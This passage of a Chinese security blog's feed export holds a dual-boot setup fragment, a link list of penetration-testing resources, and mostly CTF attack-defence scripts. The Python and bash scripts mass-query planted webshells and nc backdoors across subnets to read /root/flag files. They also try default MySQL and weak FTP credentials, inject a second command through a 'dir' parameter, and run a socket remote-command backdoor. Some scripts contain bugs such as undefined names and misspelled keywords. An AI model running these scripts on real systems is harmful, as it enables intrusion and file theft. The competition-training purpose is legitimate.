win7系统盘，同样UEFI安装用U盘引导，安装在ssd剩下的空间里，没有什么好说的。&lt;br&gt;这个时候windows和mac都安装好了，但是这个时候你拨掉U盘开机会发现直接进入了win10系统，说好的选择呢？ 不急，我们mac的efi也还没有替换呢。       五、处理电脑EFI分区：首先，用U盘引导，进入mac,同时用工具挂载电脑和系统盘两个EFI分区，并把EFI文件夹删除，把我们下载好的EFI文件夹分别放进去，不做作何处理，就是说现在电脑里有mac需要的配置、驱动等都有了，关机，拨掉U盘，开机，进入win10系统，在win10下同样挂载电脑EFI分区，怎么挂载呢？， 插入win10的系统盘，把里边的efi文件夹里边的内容替换进去（注意是内容替换，不是把原来的efi删除，把这个放进去，因为原来的efi里边已经有mac的启动文件了）        替换完了后，关机，拨掉win10系统盘，插入mac系统盘，开机，按F7,用U盘引导，在clover界面先择 boot option ,先择第一个挂载所有引导，忘了具体是什么了，大概是这个意思，如果你发现右下角的clover版本号变了，就成功了，这个时候restart，拨掉U盘，开机应该自动到clover选择界面，可以选择作意系统了。此时mac和win10双引导基本完成。        接下来就是安装各种驱动和完善了</code></pre><blockquote><p><strong>参考</strong>:<a href="https://www.jianshu.com/p/5db38511cc73" target="_blank" rel="noopener">https://www.jianshu.com/p/5db38511cc73</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一周8个精选文章:第一章</title>
      <link href="/2018/12/05/Daily01/"/>
      <url>/2018/12/05/Daily01/</url>
      
        <content type="html"><![CDATA[<blockquote><p>从外网到内网的渗透姿势分享 : <a href="https://xz.aliyun.com/t/5330" target="_blank" rel="noopener">https://xz.aliyun.com/t/5330</a></p><p>基于EVE-NG平台上构建企业内网攻防环境 : <a href="https://mp.weixin.qq.com/s/vBYxrmnBoM-Abl_y1v4DtA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/vBYxrmnBoM-Abl_y1v4DtA</a></p><p>PHP 函数漏洞总结 : <a href="https://blog.csdn.net/qq_31481187/article/details/60968595" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/60968595</a></p><p>CTF Training 经典赛题复现环境: <a href="https://github.com/CTFTraining/CTFTraining" target="_blank" rel="noopener">https://github.com/CTFTraining/CTFTraining</a></p><p>RemTeam攻击技巧和安全防御 : <a href="https://xz.aliyun.com/t/4602(https://evilwing.me/page/2/)" target="_blank" rel="noopener">https://xz.aliyun.com/t/4602(https://evilwing.me/page/2/)</a></p><p>盘点那些渗透测试中的奇淫技巧: <a href="https://paper.seebug.org/92/" target="_blank" rel="noopener">https://paper.seebug.org/92/</a></p><p>APT34工具 :<a href="https://github.com/p3pperp0tts/APT34" target="_blank" rel="noopener">https://github.com/p3pperp0tts/APT34</a></p><p>CTF线下攻防指南 : <a href="http://blog.nsfocus.net/ctf-off-line-attack-defense-guidelines/" target="_blank" rel="noopener">http://blog.nsfocus.net/ctf-off-line-attack-defense-guidelines/</a></p></blockquote><p><em><strong>转载请标明出处</strong></em></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python】:WebShell</title>
      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/"/>
      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">flag = open(<span class="string">"webshellsave.txt"</span>,<span class="string">"a"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(i)</span>:</span></span><br><span class="line">    ip=<span class="string">"192.168."</span>+str(i)+<span class="string">".128"</span></span><br><span class="line">    url=<span class="string">"http://"</span>+ip+<span class="string">"/WebShell.php/"</span></span><br><span class="line">    payload=&#123;<span class="string">'cmd'</span>:<span class="string">'cat /root/flag*.txt'</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url,payload,timeout=<span class="number">1</span>)</span><br><span class="line">        flag.write(r.url+<span class="string">"\n"</span>+r.text)</span><br><span class="line">        print(<span class="string">"GET FLAG! &gt;&gt;"</span>,r.url,<span class="string">'\n'</span>,r.text)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"\nConnect Fail &gt;&gt;"</span>,url)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">101</span>,<span class="number">254</span>):</span><br><span class="line">    t = threading.Thread(target=run, args=(i,))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p><em><strong>转载请标明出处</strong></em></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python】:PyMySQL</title>
      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/"/>
      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>突然想起来MYSQL是否也能做成自动GETFALG脚本呢。</p><p>这个还有点问题。可以自己修改下:)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">file=open(<span class="string">'MySQLsave.txt'</span>,<span class="string">'w+'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mysql_login</span><span class="params">(i)</span>:</span></span><br><span class="line">    ip=<span class="string">'192.168.'</span>+str(i)+<span class="string">'101'</span></span><br><span class="line">    username=<span class="string">'root'</span></span><br><span class="line">    password=<span class="string">'root'</span></span><br><span class="line">    payload = <span class="string">"SELECT load_file('C:/flag*.txt')"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        db = pymysql.connect(ip,username,password,<span class="string">"mysql"</span>)</span><br><span class="line">        cursor = db.cursor()</span><br><span class="line">        cursor.execute(payload)</span><br><span class="line">        data = cursor.fetchall()</span><br><span class="line">        print(data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">249</span>):</span><br><span class="line">    t = threading.Thread(target=mysql, args=(i,))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python】:WebShell_urilb</title>
      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/"/>
      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p><strong>使用urlilb模块</strong></p><p><strong>在一些特定的攻防比赛中，攻击机没有安装requests模块，只能使用urlilb模块来代替</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WebShell</span><span class="params">(i)</span>:</span></span><br><span class="line">    data = &#123;<span class="string">"dir"</span>: <span class="string">"&amp;&amp; type flag.txt"</span>&#125;</span><br><span class="line">    url = <span class="string">"http://192.168.123."</span>+str(i)+<span class="string">"/DirCtrl.php"</span></span><br><span class="line">    data_string=urllib.parse.urlencode(data)</span><br><span class="line">    new_url=url+<span class="string">"?"</span>+data_string</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        send = urllib.request.urlopen(new_url,timeout=<span class="number">1</span>)</span><br><span class="line">        print(send.read().decode(<span class="string">"utf8"</span>,<span class="string">"ignore"</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">    t = threading.Thread(target=WebShell, args=(i, ))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python】:Web_Dirs_Scnnaer</title>
      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWeb_Dirs_Scanner/"/>
      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWeb_Dirs_Scanner/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>看到一些web目录扫描器。自己也尝试写了一下xD</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">user_agent_list = [&#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'</span>&#125;,]</span><br><span class="line">user_agent = random.choice(user_agent_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target = input(<span class="string">"target host &gt;"</span>)</span><br><span class="line">dict_path_file = input(<span class="string">"dicr file &gt;"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CheckURLProtocol</span><span class="params">()</span>:</span></span><br><span class="line">    Check = re.match(<span class="string">r"http?://"</span>,target)</span><br><span class="line">    <span class="keyword">if</span> Check == <span class="literal">None</span>:</span><br><span class="line">        print(<span class="string">"[-]Example: http://127.0.0.1 or https://127.0.0.1"</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> open(dict_path_file) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> dic <span class="keyword">in</span> f.readlines():</span><br><span class="line">                url = target + str(dic)</span><br><span class="line">                url = url.replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    r = requests.get(url,headers=user_agent)</span><br><span class="line">                    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">                        print(r.url)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python】:socket_cmd连接</title>
      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACsocket_cmd%E8%BF%9E%E6%8E%A5/"/>
      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACsocket_cmd%E8%BF%9E%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>为了给学弟上公开课刻意写了一个远控脚本，虽然不这么行xD</p><ul><li><strong>Server:</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> data, s</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.bind((<span class="string">'127.0.0.1'</span>,<span class="number">10001</span>))</span><br><span class="line">    s.listen(<span class="number">5</span>)</span><br><span class="line">    print(<span class="string">"等待连接中……"</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        conn,addr = s.accept()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            print(<span class="string">'收到命令'</span>)</span><br><span class="line">            data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">            cmd = os.popen(data.decode())</span><br><span class="line">            os_result = cmd.read()</span><br><span class="line">            conn.sendall(os_result.encode(<span class="string">'utf8'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><ul><li><strong>Client:</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  socket</span><br><span class="line"></span><br><span class="line">ServerIP=(<span class="string">'127.0.0.1'</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,<span class="number">0</span>)</span><br><span class="line">    s.connect(ServerIP)</span><br><span class="line">    print(<span class="string">'[+]连接成功'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">'[-]服务器无响应'</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data=input(<span class="string">'[CMD]&gt;&gt;'</span>)</span><br><span class="line">    s.sendto(bytes(data,encoding=<span class="string">'utf8'</span>),ServerIP)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">'[+]回显成功'</span>)</span><br><span class="line">    print(data.decode())</span><br></pre></td></tr></table></figure><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python】:端口扫描</title>
      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(PortScanner)/"/>
      <url>/2018/10/10/Python%E8%84%9A%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(PortScanner)/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>在实训室无聊的时候，随手写了一下端口扫描的Python脚本.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">file=open(<span class="string">"port.txt"</span>,<span class="string">'w+'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">portscan</span><span class="params">(port)</span>:</span></span><br><span class="line">    host=<span class="string">'192.168.174.1'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        conn=s.connect_ex((host,port))</span><br><span class="line">        <span class="keyword">if</span> conn ==<span class="number">0</span>:</span><br><span class="line">            print(<span class="string">"HOST &gt; &#123;&#125; : OPEN : &#123;&#125;"</span>.format(host,post))</span><br><span class="line">            file.write(host+<span class="string">":"</span>+str(post)+<span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    excpet:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">65535</span>):</span><br><span class="line">    t=threading.Thread(target=portscan, args=(port, ))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell脚本</title>
      <link href="/2018/10/09/Shell%E8%84%9A%E6%9C%AC/"/>
      <url>/2018/10/09/Shell%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>我在全国职业技能大赛比赛时所用的shell脚本:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc后门:</span><br><span class="line">port=10001 </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 101 254`;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">ip=<span class="string">"192.168.2."</span><span class="variable">$i</span></span><br><span class="line">payload=`<span class="built_in">echo</span> <span class="string">"cat /root/flag*.txt;exit"</span> | nc <span class="variable">$ip</span> <span class="variable">$port</span>`</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">webshell:</span><br><span class="line">or i <span class="keyword">in</span> `seq 101 254`;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">ip=<span class="string">"192.168.2."</span><span class="variable">$i</span></span><br><span class="line">curl http://<span class="variable">$ip</span>/WebShell.php/?cmd=cat+%2Froot%2Fflag*.txt</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ftp:</span><br><span class="line">username=<span class="string">'admin'</span></span><br><span class="line">passwd=<span class="string">'123456'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 101 254`;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">ip=<span class="string">"192.168.2."</span><span class="variable">$i</span></span><br><span class="line">sh ftpmain.sh <span class="variable">$ip</span> <span class="variable">$username</span> <span class="variable">$passwd</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配合ftp使用</span></span><br><span class="line">ftpmain:</span><br><span class="line">ftp <span class="variable">$1</span> -inv</span><br><span class="line">user <span class="variable">$2</span> <span class="variable">$3</span></span><br><span class="line">get /root/flag*.txt</span><br><span class="line"><span class="built_in">bye</span></span><br><span class="line">!</span><br></pre></td></tr></table></figure><blockquote><p>有一些地方得注意改动，什么IP地址NC后门的端口FTP那边的弱用户弱密码什么的等等…。<br>尤其是一些标点符号的小细节不能忘记，该空格的地方就得空格，最好先实验一遍在拿去实战<br>这些都可以拿到一些攻防比赛 如: CTF的AWD 或者一些 技能大赛</p></blockquote><p><strong>转载请标明出处</strong></p>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
